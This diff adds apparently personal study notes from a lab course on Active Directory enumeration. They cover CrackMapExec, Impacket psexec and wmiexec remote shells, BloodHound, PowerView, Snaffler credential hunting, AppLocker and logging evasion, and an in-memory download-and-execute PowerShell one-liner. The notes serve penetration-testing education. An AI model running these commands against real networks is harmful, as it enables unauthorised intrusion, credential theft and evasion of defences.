@@ -1,0 +1,413 @@
+Need to find information about domain users, computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts etc...
+## Enumerating Security Controls
+### Windows Defender
+```powershell
+Get-MpComputerStatus
+```
+Look For
+```powershell
+RealTimeProtectionEnabled : True
+```
+### [AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/what-is-applocker)
+Whitelist of approved software applications or executables that are allowed to run. 
+Powershell.exe and CMD.exe are often blocked. but they forget about the other locations.
+`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
+or 
+`PowerShell_ISE.exe`
+
+May be able to call from another location.
+**List the Rules**
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+### PowerShell Constrained Language Mode
+Locks down many of the features needed to use PowerShell effectivley, such as blocking COM objects and only allowing approved .NET types, XAML-based workflows and PowerShell classes. 
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+```
+### LAPS
+[Local Administrator Password Solution](https://www.microsoft.com/en-us/download/details.aspx?id=46899) used to randomise and rotate local admin passwords on Windows hosts. to prevent lateral movement. 
+[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)can be used to enumerate.
+
+Parsing ExtendRights for all computers with LAPS enabled. Shows groups that read LAPS passwords. Often users in protected groups. 
+```powershell
+Find-LAPSDelegatedGroups
+```
+
+Check the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights". 
+*Users with **All extended Rights** can read LAPS passwords and may be less protected*
+```powershell
+Find-AdmPwdExtendedRights
+```
+
+Search for computers that have LAPS enabled when passwords expire, and even the randomised passwords if the user has access. 
+```powershell
+Get-LAPSComputers
+```
+## Credential Hunting - from Linux
+### #CrackMapExec
+Offers help for each protocol:
+`crackmapexec winrm -h`
+`crackmapexec smb -h` etc...
+**Domain User Enumeration**
+```shell
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+**Domain Group Enumeration**
+```shell
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+**Logged on Users**
+```shell
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+```
+**Share Searching**
+```shell
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+**Spider_plus**
+```shell
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+Read the results:
+```shell
+head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
+```
+
+### #SMBMap 
+
+```shell
+ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+
+**Recursive List of all Directories**
+```shell
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+### #rpcclient
+Null sessions?
+```bash
+rpcclient -U "" -N 172.16.5.5
+```
+#### [RID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)
+##### Relative Identifier
+- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
+- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
+- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
+- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
+
+Accounts can have same RID regardless of the host. 
+
+Administrators accounts will always have `500` or `0x1f4`
+##### Query User By RID
+```shell
+queryuser 0x457
+```
+Enumerate all users 
+```shell
+enumdomusers
+```
+### #Impacket Toolkit
+**Psexec.py**
+Creates a remote service by uploading a randomly-named service in the ADMIN$ share on the target host. 
+Registers the service via RPC and Window Service Control Manager. Once communication is established you get a remote shell as `system`
+```bash
+impacket-psexec inlanefreight.local/<user>:'<pass>'@172.16.5.125  
+```
+
+**wmiexec**
+Commands are executed through [Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). Does not drop any files or executables on the target host. Generates fewer logs than other modules. 
+Runs as local admin user you connected with. More stealthy approach to execution on hosts than other tools. 
+```bash
+Impacket-wmiexec inlanefreight.local/<user>:'<pass>'@172.16.5.5  
+```
+
+**Windapsearch** 
+Can use to enumerate users, groups, and computers from a windows domain utilising LDAP queries.
+
+Domain Admins
+```shell-session
+Impacket-windapsearch --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+Privileged Users
+```shell
+windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+### #Bloodhound
+Can create graphical representations of data or "attack paths"
+Uses [Graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visualise relationships and uncover new attack paths. 
+Consists of [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collector
+Can right custom queries in [Cypher Language](https://blog.cptjesus.com/posts/introtocypher/)
+```shell
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+```
+**Upload the Zip File to BloodHound GUI**
+`sudo neo4j start`
+***Unsupported Systems are really good for finding pivot points.***
+## Credential Hunting from Windows
+### Active Directory Power Shell Module 
+Around 150 modules
+**Installed**
+```powershell
+Import-Module ActiveDirectory
+```
+```powershell
+Get-Module
+```
+**Get Domain Info**
+```powershell
+Get-ADDomain
+```
+**Get-ADUser**
+```powershell
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+Filter for accounts with ServicePrincipalName property populated, this means they may be susceptible to a kerbroasting attack.
+**Check For Trust relationships**
+```powershell
+Get-ADTrust -Filter *
+```
+Print Trust relationships the domain has. 
+**Group Enumeration**
+```powershell
+Get-ADGroup -Filter * | select name
+```
+***Detailed Group Info***
+```powershell
+Get-ADGroup -Identity "Backup Operators"
+```
+***Group Membership***
+Lists the members of a group
+```powershell
+Get-ADGroupMember -Identity "Backup Operators"
+```
+### PowerView
+Help Gain Situational Awareness within an AD environment
+Can identify where users are logged in on a network, enumerate domain information, perform kerbroasting. 
+#### Example CMDLets
+| **Command**                         | **Description**                                                                            |
+| ----------------------------------- | ------------------------------------------------------------------------------------------ |
+| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
+| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
+| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
+| **Domain/LDAP Functions:**          |                                                                                            |
+| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
+| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
+| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
+| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
+| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
+| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
+| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
+| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
+| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
+| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
+| **GPO Functions:**                  |                                                                                            |
+| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
+| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
+| **Computer Enumeration Functions:** |                                                                                            |
+| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
+| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
+| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
+| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
+| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
+| **Threaded 'Meta'-Functions:**      |                                                                                            |
+| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
+| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
+| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
+| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
+| **Domain Trust Functions:**         |                                                                                            |
+| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
+| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
+| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
+| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
+| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |
+| 
+
+sd|                                                                                            |
+
+**Domain User Information**
+```powershell
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
+**Recursive Group Membership**
+Look for potential targets
+```powershell
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+**Trust Enumeration**
+```powershell
+ Get-DomainTrustMapping
+```
+**Test for Local Admin Access**
+```powershell
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+```
+**Find users subject to kerberoasting**
+```powershell
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
+
+### SharpView
+Excellent tool for AD recon
+```powershell
+.\SharpView.exe Get-DomainUser -Help
+```
+Enumerate information about a specific user
+```powershell
+.\SharpView.exe Get-DomainUser -Identity <username>
+```
+### [Snaffler](https://github.com/SnaffCon/Snaffler)
+Can help aquire credentials and other sensitve information. 
+Obtains a list of hosts within the domain and enumerates them for shares and readable directories. 
+*Needs to be run from a domain joined hosts*
+```bash
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+```
+`-s` - Prints results
+
+### Blood Hound 
+```powershell
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+Upload ZIP to local host
+
+## Living off the Land
+#### Enumeration commands
+|**Command**|**Result**|
+|---|---|
+|`hostname`|Prints the PC's Name|
+|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
+|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
+|`ipconfig /all`|Prints out network adapter state and configurations|
+|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
+|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
+|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
+
+#### Powershell Commands 
+
+|**Cmd-Let**|**Description**|
+|---|---|
+|`Get-Module`|Lists available modules loaded for use.|
+|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
+|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
+|`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
+|`Get-ChildItem Env: \| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|
+|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|
+#### Downgrading Powershell
+```powershell
+powershell.exe -version 2
+```
+With [Script Block Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)enabled. 
+This can stop logs appearing in `Applications and Services Logs` 
+
+#### Checking Defences
+**Firewall Checks**
+```powershell
+netsh advfirewall show allprofiles
+```
+**Defender Checks**
+```cmd
+sc query windefend
+```
+**Check status and configuration of Defender**
+```powershell
+ Get-MpComputerStatus
+```
+#### Who else is logged in
+```powershell
+qwinsta
+```
+#### Networking Information 
+|**Networking Commands**|**Description**|
+|---|---|
+|`arp -a`|Lists all known hosts stored in the arp table.|
+|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
+|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
+|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|
+
+#### Windows Mangement Instrumentation (WMI)
+WMI is a scripting engine to retrieve information and run administrative tasks on local and remote hosts.
+
+|**Command**|**Description**|
+|---|---|
+|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
+|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
+|`wmic process list /format:list`|A listing of all processes on host|
+|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
+|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
+|`wmic group list /format:list`|Information about all local groups|
+|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|
+#### Net commands 
+
+| **Command**                                     | **Description**                                                                                                              |
+| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| `net accounts`                                  | Information about password requirements                                                                                      |
+| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
+| `net group /domain`                             | Information about domain groups                                                                                              |
+| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
+| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
+| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
+| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
+| `net groups /domain`                            | List of domain groups                                                                                                        |
+| `net localgroup`                                | All available groups                                                                                                         |
+| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
+| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
+| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
+| `net share`                                     | Check current shares                                                                                                         |
+| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
+| `net user /domain`                              | List all users of the domain                                                                                                 |
+| `net user %username%`                           | Information about the current user                                                                                           |
+| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
+| `net view`                                      | Get a list of computers                                                                                                      |
+| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
+| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
+| `net view /domain`                              | List of PCs of the domain                                                                                                    |
+ 
+#### Dsquery
+[Dsquery](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)>) is a command line tool to find AD objects. 
+**User Search**
+```powershell
+dsquery user
+```
+**Computer Search**
+```powershell
+dsquery computer
+```
+**Wildcard Search**
+```powershell
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+```
+**Users with Specific Attributes set (PASSWD_NOTREQD)**
+```powershell
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+```
+**Searching for Domain Controllers**
+```powershell
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
+
+#### LDAP Filtering Explained
+**UAC Values**
+`userAccountControl:1.2.840.113556.1.4.803=8192`
+=8192 represents the decimal bitmask for the UAC value.
+![[Pasted image 20230814165650.png]]
+**OID Match Strings**
+Rules used to match a bit value with attributes
+3 Main matching rules:
+1. `1.2.840.113556.1.4.803`
+
+the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+2. `1.2.840.113556.1.4.804`
+
+When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+3. `1.2.840.113556.1.4.1941`
+
+This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+**Logical Operators**
+Comvine multiple operators with & (and)
+`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
